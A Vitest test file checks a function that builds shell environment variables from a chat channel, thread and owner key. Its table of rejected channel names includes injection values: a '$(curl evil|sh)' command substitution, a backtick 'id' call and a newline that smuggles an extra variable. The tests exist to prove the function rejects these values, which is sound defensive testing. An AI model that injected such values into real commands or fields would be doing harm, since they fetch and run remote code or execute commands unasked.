import { expect, it } from "vitest";
import { canonicalPublicKey } from "../../shared/identity/public-key";
import { conversationEnv } from "./conversation-env";

const channelId = "11111111-1111-4111-8111-111111111111";
const root = "a".repeat(64);
const owner = "b".repeat(64);
const npub = canonicalPublicKey(owner);

it("describes a thread with the terminal's variables", () => {
  expect(
    conversationEnv({ channelId, channelName: "ops-2.0_x", root, owner }),
  ).toEqual({
    BUZZ_CHANNEL_ID: channelId,
    BUZZ_CHANNEL: "ops-2.0_x",
    BUZZ_NPUB: npub,
    BUZZ_THREAD_ID: root,
  });
});

it("leaves the thread out, not empty, for a channel or DM session", () => {
  const env = conversationEnv({ channelId, channelName: "ops", owner });
  expect(env).not.toHaveProperty("BUZZ_THREAD_ID");
  expect(env.BUZZ_CHANNEL_ID).toBe(channelId);
});

it("keeps a name in any script", () => {
  expect(
    conversationEnv({ channelId, channelName: "équipe 日本", owner })
      .BUZZ_CHANNEL,
  ).toBe("équipe 日本");
});

it.each([
  ["missing", undefined],
  ["empty", ""],
  ["too long", "a".repeat(65)],
  ["command substitution", "$(curl evil|sh)"],
  ["backtick", "a`id`"],
  ["newline", "ops\nBUZZ_THREAD_ID=x"],
  ["quotes", `o"p's`],
  ["equals", "a=b"],
])("names the channel by UUID when the name is %s", (_, channelName) => {
  expect(conversationEnv({ channelId, channelName, owner }).BUZZ_CHANNEL).toBe(
    channelId,
  );
});

it("keeps a 64-character name", () => {
  const name = "a".repeat(64);
  expect(
    conversationEnv({ channelId, channelName: name, owner }).BUZZ_CHANNEL,
  ).toBe(name);
});

it.each([
  ["a channel ID that is not a UUID", { channelId: "chan-1" }],
  ["a malformed thread root", { root: `${"a".repeat(63)}g` }],
  ["a thread root of the wrong length", { root: "a".repeat(63) }],
  ["an owner that is not a public key", { owner: "npub1example" }],
])("describes nothing for %s", (_, change) => {
  expect(conversationEnv({ channelId, root, owner, ...change })).toEqual({});
});
